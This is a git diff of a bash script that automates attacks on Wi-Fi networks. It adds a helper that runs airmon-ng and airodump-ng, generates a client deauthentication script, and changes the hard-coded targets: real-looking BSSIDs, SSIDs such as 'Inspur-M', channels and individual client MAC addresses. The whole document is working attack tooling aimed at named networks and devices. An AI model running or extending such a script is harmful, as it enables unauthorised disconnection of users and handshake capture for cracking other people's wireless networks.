@@ -28,7 +28,7 @@ function crack(){
 }
 
 function genDeAuthenScript(){
-    local scriptName="${SSID}-deAuthen-$cli.sh"
+    local scriptName="${SSID}-script-deAuthen-${cli}.sh"
     if [ ! -s $scriptName ];then
 	cat > $scriptName <<EOF
 #!/bin/bash
@@ -41,8 +41,22 @@ EOF
     fi
 }
 
-function main(){
-    genDeAuthenScript
+function genCheckScript(){
+    local scriptName="${SSID}-script-checkCli.sh"
+    if [ ! -s $scriptName ];then
+	cat > $scriptName <<EOF
+#!/bin/bash
+
+airmon-ng start $ifname
+airodump-ng -c $channel --essid ${SSID} --bssid $BSSID $ifmon
+airmon-ng stop $ifmon
+
+EOF
+	chmod a+x $scriptName
+    fi
+}
+
+function docrack(){
     reset
     toMonitor
     injectTest
@@ -51,15 +65,28 @@ function main(){
     reset
 }
 
+function main(){
+    genDeAuthenScript
+    genCheckScript
+    if [ $# -gt 0 ];then
+	docrack
+    fi
+}
+
 #BSSID="6C:B0:CE:17:AD:71"
 #SSID="phome-wndr"
 #channel="3"
 #cli="50:68:0A:D5:02:B4"
 
-BSSID="14:CF:92:BC:A9:4D"
-SSID="InspurHot"
-channel="10"
-cli="9C:AD:97:D1:4F:31"
+#BSSID="14:CF:92:BC:A9:4D"
+#SSID="InspurHot"
+#channel="10"
+#cli="9C:AD:97:D1:4F:31"
+
+BSSID="EC:88:8F:43:97:58"
+SSID="Inspur-M"
+channel="6"
+cli="54:27:1E:A8:12:07"
 
 #BSSID="70:F9:6D:34:FB:91"
 #SSID="Inspur"
@@ -72,4 +99,4 @@ capPrefix="$SSID-$BSSID"
 ifname="wlp2s0"
 ifmon="${ifname}mon"
 
-main
+main $@
